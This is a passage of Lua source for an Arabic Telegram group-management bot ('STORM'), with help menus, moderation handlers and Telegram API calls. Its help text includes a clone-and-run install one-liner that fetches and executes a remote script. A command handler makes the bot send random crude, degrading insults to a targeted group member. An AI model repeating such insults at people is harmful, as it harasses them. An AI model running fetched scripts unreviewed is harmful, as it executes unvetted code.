📬*¦* جلب صوره◗ثم ارسل رقم الصوره◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📛*¦* ايدي بالرد ◗لعرض الايدي◖
📛*¦* الرابط ◗لعرض رابط المجموعه◖
📛*¦* القرانين ◗لعرض القوانين ◖
📛*¦* عدد الاضافه◗لعرض العدد اضافه ◖
📛*¦* المطور ◗لعرض معلومات المطور◖
📛*¦* مسح رسايلي ◗لمسح رسائلك كلها◖
📛*¦* الرتبه ◗بالرد لعرض رتبته ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
💠*¦* اسم البوت ◗ بوسه بالرد◖
💠*¦* اسم البوت◗شنو رئيك بهاذا بالرد◖
💠*¦* اسم البوت◗شنو رئيك بهاي بالرد◖
——————༻📛༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end 
if text =='م7' then if not is_sudo(msg)  then storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للمطور فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي المطور 🍃
💠*¦* اۅٲﻣڔ ٲڶمطۄريڼ ✓
——————༻💠༺——————
🔸 *¦*  تفعيل ◗ لـتفعيل البوت✓ ◖
🔸 *¦*  تعطيل ◗ لـتعطيل البوت✓ ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📛 *¦* رفع منشئ ◗ لـرفع المنشئ ◖
📛 *¦* تنزيل منشئ ◗ لـتنزيل المنشئ ◖
📛 *¦* مسح المنشئين ◗لمسح المنشئين◖
📛 *¦* المنشئين ◗لـعرض المنشئين ◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🎲 *¦* رفع المنشئ ◗ لـرفع مدير ◖
🎲 *¦* المجموعات ◗ لعرض المجموعات◖
🎲 *¦* الكروبات ◗ لـعرض عدد الكروبات◖
🎲 *¦* غادر◗ للمغادرة ◖
🎲 *¦* غادر + ◗ايدي الكروب للمغادرة◖
🎲 *¦* كشف + ◗ايدي الكروب◖
——————༻💠༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end 
if text =='م8' then if not is_devtaha(msg) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "🚸❯❯ عذرا هاذا الامر للمطور الاساسي فقط\n", 1, "md")  else
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي المطور🍃
🚨*¦* في اوامر المطور الاساسي 
——————༻🚸༺——————
⚜*¦* ارسل الاوامر في الخاص
⚜*¦* تفعيل التواصل◗للدردشه خاص◖
⚜*¦* تعطيل التواصل◗لتعطيل الدردشه◖
⚜*¦* تفعيل ردود المطور ◗لتفعيلها◖
⚜*¦* تعطيل ردود المطور ◗لتعطيلها◖
⚜ *¦* حظر + ◗ايدي الكروب◖
⚜ *¦* الغاء الحظر + ◗ايدي الكروب◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📛*¦* رفع مطور ◗لرفعه مطور◖
📛*¦* تنزيل مطور ◗لتنزيله مطور◖
📛*¦* المطورين لعرض ◗المطورين◖
📛*¦* رفع مميز عام ◗لرفعه في الكل◖
📛*¦* تنزيل مميز عام ◗لتنزيله مميز ◖
📛*¦* المميزين عام◗لعرض المميزين◖
📛*¦* حظر عام ◗لحضره في الكل◖
📛*¦* الغاء العام ◗الغاء حظره في الكل◖
📛*¦* قائمه العام◗لعرض محظورين عام◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🎙*¦* اضف رد للكل ◗لاضافه رد للكل◖
🎙*¦* حذف رد للكل ◗لحذف رد للكل◖
🎙*¦* ردود المطور ◗لعرض الردود◖
🎙*¦* مسح ردود المطور◗لمسح الردود◖
🎙*¦* اضف رد بالرد للكل◗للضافه للكل ◖
🎙*¦* حذف رد بالرد للكل◗لحذف الرد◖
🎙*¦* ردود المطور بالرد ◗لعرض الردود◖
🎙*¦* مسح ردود المطور بالرد◗للمسح◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
📯 *¦* وضع اسم للبوت ◗ثم  الاسم◖
📯 *¦* اذاعه + ايدي لكروب ◗ للرسال ◖
📯*¦* اذاعه ◗ثم ارسل النص ◖
📯*¦* اذاعه خاص◗ثم ارسل النص◖
📯*¦* اذاعه للكل◗ ثم ارسل النص◖
📯*¦* اذاعه بالرد◗ل ارسال النص◖
📯*¦* اذاعه خاص◗ل ارسال النص◖
📯*¦* اذاعه للكل◗ بالرد ارسال النص◖
📯*¦* توجيه ◗ل ارسال التوجيه◖
📯*¦* توجيه خاص ◗لارسال التوجيه◖
📯*¦* توجيه للكل◗ل توجيه للكل◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🚸*¦* الكروبات◗لعرض عدد المجموعات◖
🚸*¦* المجموعات ◗لعرض الايديات◖
🚸*¦* الاحصائيات ◗ لعرض اعداد البوت◖
🚸*¦* مسح المشتركين ◗ لمسحهم ◖
 ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
💠*¦* ضع كليشه المطور ◗ثم النص◖
💠*¦* حذف كليشه المطور ◗ لحذف الرد◖
💠*¦* ضع كليشه ستارت◗ثم النص◖
💠*¦* حذف كليشه ستارت ◗لحذف الرد◖
💠*¦* جلب كليشه ستارت ◗لجلب النص◖
💠*¦* ضع رد للتواصل ◗ثم ارسل النص◖ 
💠*¦* ضع عدد التفعيل ◗ثم ارسل العدد◖ 
💠*¦* حذف رد التواصل ◗لحذف الرد◖
💠*¦* جلب رد التواصل ◗لئرسال النص◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🔸*¦* تحديث السورس ◗لتحديث البوت◖
🔸*¦* مسح المجموعات◗ لمغادره الكل◖ 
🔸*¦* مسح قائمه العام◗لمسح القائمه◖ 
🔸*¦* مسح المميزين عام◗لمسح القائمه◖
🔸*¦* مسح المطورين◗لمسح المطورين◖ 
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
🔹*¦* وضع اسم البوت◗ثم ارسل الاسم◖
🔹*¦* تفعيل الكتابه ◗ لتفعيل الكتابته◖
🔹*¦* تعطيل الكتابه ◗ لتعطيل الكتابه◖
🔹*¦* تفعيل البوت الخدمي◗ لتفعيله ◖
🔹*¦* تعطيل البوت الخدمي◗لتعطيله◖
🔹*¦*تغير كليشه الترحيب◗لتغير الكليشه◖
🔹*¦*تنضيف المشتركين◗ليتم مسح الوهمي◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
 ]]  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')  end end end
if text == 'السورس' or text =='سورس' or text=='يا سورس' then
local text = [[
*🚨¦ اهلا بك في سورس ستورم 🍃*
——————༻🚨༺——————
*🚸¦ لتنصيب السورس اتبع مايلي*
*⚀¦ افتح ترمنال جديد *
*⚁¦* اضغط على 👇 الرابط ليتم نسخه
*⚂¦* الصق الرابط في الترمنال ثم انتر
`git clone https://github.com/NOVAR1/STORM.git;cd STORM;chmod +x tg;chmod +x STORM.sh;chmod +x SM;./STORM.sh`
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*⚃¦ راح يطلب معلومات منك*
*📬¦* بعد كل امر اضغط انتر
*📛¦* ايدي المطور الاساسي
*📛¦* معرف المطور الاساسي
*📛¦* توكن البوت
*📛¦* اسم للبوت
*📬¦* كود الرن  👇
`cd STORM;./SM`
——————༻🚨༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖
*📯¦* قناتنا @STORMCLI
]] storm_sendMsg(msg.chat_id_, msg.id_, 1,text, 1, 'md')   end
if text == 'تفعيل'  and is_sudo(msg) then   
if not is_sudo(msg) then
storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* انت لست مطور في البوت\n", 1, "md") 
return false  end 
if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــــه لا استطيع تفعيل المجموعه \n📛*¦* انا لست ادمن يرجى ترقيتي ادمن \n👮\n", 1, "md") 
return false  end 
if tahadevstorm:get(DEVSTOR.."test:group"..msg.chat_id_)  then
storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* المجموعه بالتاكيد تم تفعيلها 💯\n', 1, 'md')
tahadevstorm:set(DEVSTOR.."add:bot:group"..msg.chat_id_, true) 
local function promote_admin(extra, result, success) local admins = result.members_ for i=0 , #admins do t=''..get_username(admins[i].user_id_)..'➣'..get_name(admins[i].user_id_) tahadevstorm:sadd(DEVSTOR..'mods:'..msg.chat_id_,admins[i].user_id_)  if result.members_[i].status_.ID == "ChatMemberStatusCreator" then owner_id = admins[i].user_id_ t=''..get_username(owner_id)..'➣'..get_name(owner_id) tahadevstorm:sadd(DEVSTOR..'moder'..msg.chat_id_,owner_id)  end end end chek_admin(msg.chat_id_,promote_admin)   
else
local function promote_admin(extra, result, success) local admins = result.members_ for i=0 , #admins do t=''..get_username(admins[i].user_id_)..'➣'..get_name(admins[i].user_id_) tahadevstorm:sadd(DEVSTOR..'mods:'..msg.chat_id_,admins[i].user_id_)  if result.members_[i].status_.ID == "ChatMemberStatusCreator" then owner_id = admins[i].user_id_ t=''..get_username(owner_id)..'➣'..get_name(owner_id) tahadevstorm:sadd(DEVSTOR..'moder'..msg.chat_id_,owner_id)  end end end chek_admin(msg.chat_id_,promote_admin)   
function check_can_send(arg,data)  
if ( data.member_count_ > tonumber(tahadevstorm:get(DEVSTOR..'setadd:bot'..bot_id) or 100) ) then
test = '📮¦ المجموعه تـم تفعيــلها بـنجـاح 🎪\n\nꪜ'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=test, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0,
length_=34,  user_id_=msg.sender_user_id_}}}}, dl_cb, nil)
 tahadevstorm:sadd(DEVSTOR..'add:num'..msg.sender_user_id_,msg.chat_id_) tahadevstorm:set(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  tahadevstorm:sadd(DEVSTOR..'bot:gpsby:id', msg.chat_id_)   tahadevstorm:sadd(DEVSTOR.."botgps", msg.chat_id_)  
else
local taha = tahadevstorm:get(DEVSTOR..'setadd:bot'..bot_id)
storm_sendMsg(msg.chat_id_, msg.id_, 1, '🔬*¦* المجموعه تحتوي على *{'..data.member_count_..'}* عضو\n💥*¦* لا استطيع تفعيل المجموعه \n📑*¦* يجب ان يكون عدد الاعضاء *{'..(taha or 100)..'}* \n ', 1, 'md') 
tahadevstorm:del(DEVSTOR.."test:group" .. msg.chat_id_)
end
if data.member_count_ > tonumber(tahadevstorm:get(DEVSTOR..'setadd:bot'..bot_id) or 100) and not is_devtaha(msg) and not tahadevstorm:get(DEVSTOR.."add:bot:"..msg.chat_id_) then    
function check_can_send1(extra,result,success)  
username = '@'..(result.username_ or 'ماكو معرف ❌')..''
local text = [[
*📬¦* مرحبا يا عزيزي المطور 🍃
*📡¦* لقد تم تفعيل مجموعه جديده
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*🚨¦ معلومات المجموعه*
📡*¦* ايدي المجموعه ◗`]]..msg.chat_id_..[[`◖
📑*¦* اسم المجموعه ◗`]]..title_name(msg.chat_id_)..[[`◖
*👮¦ عدد الادمنيه ◗]]..data.administrator_count_..[[◖*
🚷*¦ عدد المطرودين ◗]]..data.kicked_count_..[[◖*
👨*¦ عدد الاعضاء ◗]]..data.member_count_..[[◖*
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*??¦ معلومات المطور *
📛*¦* ايدي المطور ◗`]]..msg.sender_user_id_..[[`◖
💠*¦* معرف المطور ◗ []]..username..[[] ◖
🔰*¦* اسم المطور ◗`]]..result.first_name_..[[`◖
]]  storm_sendMsg(SUDO, 0, 1,text, 1, 'md')    tahadevstorm:setex(DEVSTOR.."add:bot:"..msg.chat_id_, 240, true)  end getUser(msg.sender_user_id_,check_can_send1) end end  getChannelFull(msg.chat_id_, check_can_send, {chat_id=msg.chat_id_,msg_id=msg.id_}) end tahadevstorm:set(DEVSTOR.."test:group"..msg.chat_id_,'storm')   end  
if text and text:match("^ضع عدد التفعيل$") and is_devtaha(msg) then  tahadevstorm:setex(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📊¦ ارسل لي العدد الان*'  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == 'تعطيل'   and is_sudo(msg) then      
if not tahadevstorm:get(DEVSTOR.."test:group"..msg.chat_id_)  then
storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦* المجموعه بالتاكيد تم تعطيلها ❌\n', 1, 'md')
tahadevstorm:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  else
test = '🚨¦ المجموعه تـم تعطيــلها بـنجـاح 🚫\n\n✘'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=test, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0,
length_=34,  user_id_=msg.sender_user_id_}}}}, dl_cb, nil)
tahadevstorm:del(DEVSTOR.."add:bot:group"..msg.chat_id_, true)  tahadevstorm:srem(DEVSTOR..'bot:gpsby:id', msg.chat_id_)   tahadevstorm:srem(DEVSTOR.."botgps", msg.chat_id_)  
tahadevstorm:srem(DEVSTOR..'add:num'..msg.sender_user_id_,msg.chat_id_) tahadevstorm:del(DEVSTOR.."test:group" .. msg.chat_id_) end
if not is_devtaha(msg) and not tahadevstorm:get(DEVSTOR.."rem:bot:"..msg.chat_id_) then    
function check_can_send1(extra,result,success)  
username = '@'..(result.username_ or 'ماكو معرف ❌')..''
local text = [[
*📮¦* مرحبا يا عزيزي المطور 🍃
*📬¦* لقد تم تعطيل مجموعه جديده
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*🚨¦ معلومات المجموعه*
📡*¦* ايدي المجموعه ◗`]]..msg.chat_id_..[[`◖
📑*¦* اسم المجموعه ◗`]]..title_name(msg.chat_id_)..[[`◖
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*🚸¦ معلومات المطور *
📛*¦* ايدي المطور ◗`]]..msg.sender_user_id_..[[`◖
💠*¦* معرف المطور ◗ []]..username..[[] ◖
🔰*¦* اسم المطور ◗`]]..result.first_name_..[[`◖
]] storm_sendMsg(SUDO, 0, 1,text, 1, 'md')
                        tahadevstorm:setex(DEVSTOR.."rem:bot:"..msg.chat_id_, 240, true)
                     end
                  end
                  getUser(msg.sender_user_id_,check_can_send1)
                  tahadevstorm:del(DEVSTOR.."test:group"..msg.chat_id_)
               end  
if text and text:match("^زخرفه$")  then   tahadevstorm:setex(DEVSTOR.."skrafa:name" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)   tahadevstorm:setex(DEVSTOR.."skrafa:namen" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*⚡¦* ارسل الاسم الذي تريد زخرفته \n*📬¦* سواء كان بالعربي او بالانكلش 🍁'   storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == 'صنع رابط' and is_mod(msg) then  tahadevstorm:del('cleanbotslimit:'..msg.chat_id_)   function taha (arg ,data)   exportChatInviteLink(msg.chat_id_)     if not data.invite_link_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* لا استطيع صنع رابط للمجموعه \n*📬¦* حاول بعد مره اخرى بعد 3 دقائق\n", 1, "md")   return false  end    storm_sendMsg(msg.chat_id_, msg.id_, 1,'💠*¦* تم صنع رابط للمجموعه\n🚨*¦* ستنتهي مدة الرابط بعد دقيقتين \nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n['..data.invite_link_..']', 1, 'md')    end    getChannelFull(msg.chat_id_, taha, {chat_id=msg.chat_id_,msg_id=msg.id})    end
if text and text:match('^الرابط (-%d+)') and is_devtaha(msg) then    local ch = text:match('الرابط (-%d+)')   exportChatInviteLink(ch)   function taha (arg ,data)   if not data.invite_link_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* لا استطيع صنع رابط للمجموعه \n*📬¦* حاول بعد مره اخرى بعد 3 دقائق\n", 1, "md")    return false  end    storm_sendMsg(msg.chat_id_, msg.id_, 1,'💠*¦* تم صنع رابط للمجموعه\n🚨*¦* ستنتهي مدة الرابط بعد دقيقتين \nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n['..data.invite_link_..']', 1, 'md')    end    getChannelFull(ch, taha, {chat_id=ch,msg_id=msg.id})    end if text and text:match('(.*)') then  taha = tahadevstorm:smembers(DEVSTOR..'botgps') for k,v in pairs(taha) do tahadevstorm:sadd(DEVSTOR..'bot:gpsby:id',v)   tahadevstorm:sadd(DEVSTOR.."botgps",v)   end end
if tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if text and text:match('^هينه @(.*)') and is_sudo(msg) then  local username = text:match('^هينه @(.*)') function hena(extra,result,success) if result.id_ then  if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه ', 1, 'md')  return false  end  if tonumber(result.id_) == tonumber(SUDO) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md')  return false  end  local taha = { "تعال لك @"..username.." كواد فرخ دودكي مستنقع 😹👻 ","لك @"..username.." حيوان اهينك بل بسطال ","لك  @"..username.." حبي اكعد راحه ولتندك باسيادك","خاب انجب @"..username.." لا اهينك هسه ",} storm_sendMsg(msg.chat_id_, result.id_, 1,''..taha[math.random(#taha)]..'', 1, 'html') else  storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  العضو لا يوجد في المجموعه ', 1, 'md') end end saddbyusername(username,hena) end
if text == 'تقيد' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg)  and tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_) then   function kedrep(extra, result, success) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  ked(msg,msg.chat_id_,result.sender_user_id_) end end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kedrep) end
if text and text:match('^تقيد @(.*)') and tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_) and is_mod(msg)    then  local username = text:match('تقيد @(.*)') function keduser(extra,result,success)  if result.id_ then if tonumber(result.id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌*¦* لا تستطيع تقيد البوت', 1, 'md')  return false  end if storm1(msg.chat_id_,result.id_) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تقييـده بنجـاح'  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.."") tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) tahadevstorm:sadd(DEVSTOR.."keed", msg.chat_id_)  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') end end end end  saddbyusername(username,keduser) end
if text and text:match('^تقيد (%d+)') and tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_) and is_mod(msg)   then local user = text:match('تقيد (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '❌*¦* لا تستطيع تقيد البوت', 1, 'md')  return false  end  if storm1(msg.chat_id_,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  لا تسطيع حضر او تقييد او كتم او طرد ( الادمنيه و المدراء )', 1, 'md') else if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  tahadevstorm:sadd(DEVSTOR..'tedmembars'..msg.chat_id_,user) tahadevstorm:sadd(DEVSTOR.."keed", msg.chat_id_)  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.."") zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تقييـده بنجـاح' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') tahadevstorm:sadd(DEVSTOR.."keed", msg.chat_id_)  end end end getUser(user, bot_kick) end
if text == 'الغاء تقيد' and tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_) and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then  function kedrep(extra, result, success) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else unked(msg,msg.chat_id_,result.sender_user_id_) end end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kedrep)  end
if text and text:match('^الغاء تقيد @(.*)') and is_mod(msg) then  local username = text:match('الغاء تقيد @(.*)') function keduser(extra,result,success)  if result.id_ then if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  tahadevstorm:srem(DEVSTOR..'tedmembars'..msg.chat_id_,result.id_) tahadevstorm:srem(DEVSTOR.."keed", msg.chat_id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم الغاء تقييـده بنجـاح'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end end end  saddbyusername(username,keduser) end
if text and text:match('^الغاء تقيد (%d+)') and is_mod(msg) then local user = text:match('الغاء تقيد (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  tahadevstorm:srem(DEVSTOR..'tedmembars'..msg.chat_id_,user) tahadevstorm:srem(DEVSTOR.."keed", msg.chat_id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم الغاء تقييـده بنجـاح' tahadevstorm:srem(DEVSTOR.."keed", msg.chat_id_)  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md') end  end getUser(user, bot_kick) end
if text ==('المقيدين') and is_mod(msg) then    local list = tahadevstorm:smembers(DEVSTOR..'tedmembars'..msg.chat_id_) local t = '*📊¦ قائمه مقيدين المجموعه 🍂*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'  for k, v in pairs(list) do  if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end  end if #list == 0 then t = '*📬¦* لا يوجد مقيدين في المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text == ""..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم').." هينه" or text == ""..(''..botname..'').." هينه" then function necha(extra, result, success) if tonumber(result.sender_user_id_) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه 😒', 1, 'md')  return false  end  if tonumber(result.sender_user_id_) == tonumber(SUDO) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md')  return false  end local text = "تدلل حياتي" storm_sendMsg(msg.chat_id_, msg.id_, 1,text, 1, 'md') local taha = { "تعال لك كواد فرخ دودكي مستنقع 😹👻","لك حيوان اهينك بل بسطال ","لك حبي اكعد راحه ولتندك باسيادك","خاب انجب لا اهينك هسه "} storm_sendMsg(msg.chat_id_, result.id_, 1,''..taha[math.random(#taha)]..'', 1, 'md') end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),necha)   end end
if text ==  ""..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم').." بوسه" or text == ""..(''..botname..'').." بوسه"  then function necha(extra, result, success) local taha = {"خلي يزحفلي وابوسه 😻",'يعني كل شويه ابوسه كافي 😒','اخ ممممح من الحلكك ولك '..get_name(msg.sender_user_id_)..'','ما ابوسه والله زاحف هاذا','اخ يفدوا مممح 💚' } storm_sendMsg(msg.chat_id_, result.id_, 1,''..taha[math.random(#taha)]..'', 1, 'md') end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),necha)   end end
if text and text:match('^غادر (-%d+)')  and is_sudo(msg) then gp = text:match('غادر (-%d+)') tahadevstorm:srem(DEVSTOR..'bot:gps', gp) tahadevstorm:srem(DEVSTOR..'bot:gpsby:id', gp) tahadevstorm:srem(DEVSTOR.."botgps",gp) tahadevstorm:del(DEVSTOR..'mod:'..gp) tahadevstorm:del(DEVSTOR..'moder'..gp) tahadevstorm:del(DEVSTOR..'banned:'..gp) tahadevstorm:del(DEVSTOR.."add:bot:group"..gp) tahadevstorm:del(DEVSTOR.."setmoder:"..gp) tahadevstorm:del(DEVSTOR.."gps:settings:"..gp) tahadevstorm:del(DEVSTOR.."gps:settings:"..gp) storm_sendMsg(text:match('غادر (-%d+)'), 0, 1,'💢*¦*تم مغادره البوت من المجموعه \n♨*¦*الامر بواسطه مطور البوت \n 📪*¦*للاستفسار راسل مطور البوت ', 1, 'md') changeChatMemberStatus(text:match('غادر (-%d+)'), bot_id, "Left") storm_sendMsg(msg.chat_id_, msg.id_, 1,'📬*¦*تم ازاله المجموعه من مجموعات البوت بنجاح ✔ ', 1, 'md') end if tonumber(msg.reply_to_message_id_) > 0 then
if text ==("مسح") and is_mod(msg) then delete_msg(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   end   end
if text ==('تفعيل الترحيب') and is_mod(msg) then tahadevstorm:set(DEVSTOR..'add:welc:'..msg.chat_id_,'add') storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم تفعيل الترحيب', 1, 'md') end
if text ==('تعطيل الترحيب') and is_mod(msg) then tahadevstorm:set(DEVSTOR..'add:welc:'..msg.chat_id_,'rem') storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم تعطيل الترحيب', 1, 'md') end
if text and text:match('^ضع ترحيب (.*)') and is_mod(msg) then local welcome = text:match('^ضع ترحيب (.*)') tahadevstorm:set(DEVSTOR..'welcome:'..msg.chat_id_,welcome) local t = '💥*¦*  تم وضع الترحيب ( `'..welcome..'` )' storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text ==('مسح الترحيب') and is_mod(msg) then tahadevstorm:del(DEVSTOR..'welcome:'..msg.chat_id_,welcome) storm_sendMsg(msg.chat_id_, msg.id_, 1,'💥*¦*  تم مسح ترحيب المجموعه', 1, 'md') end
if text and text:match("^ضع صوره") and is_mod(msg) then tahadevstorm:set(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true) storm_sendMsg(msg.chat_id_, msg.id_, 1, '♻*¦* ارسل لي الصوره الان ', 1, 'md') end           end
